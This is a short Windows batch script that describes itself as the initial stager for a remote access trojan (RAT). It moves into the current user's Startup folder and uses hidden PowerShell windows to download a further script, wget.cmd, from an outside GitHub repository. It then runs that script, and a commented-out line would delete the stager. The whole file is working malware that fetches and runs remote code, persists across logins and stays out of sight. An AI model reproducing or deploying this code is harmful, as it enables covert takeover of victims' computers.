@REM initial stager for RAT
@REM created by : Reihtw

@REM variables
set INITIALPATH=%cd%
set STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

@REM move into startup folder
cd %STARTUP%

@REM write payloads to startup folder
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/entropyleech/rat-project/refs/heads/main/files/wget.cmd' -OutFile 'wget.cmd'"

powershell Start-Process powershell.exe -windowstyle hidden "./wget.cmd"


cd %INITIALPATH%
@REM del initial.cmd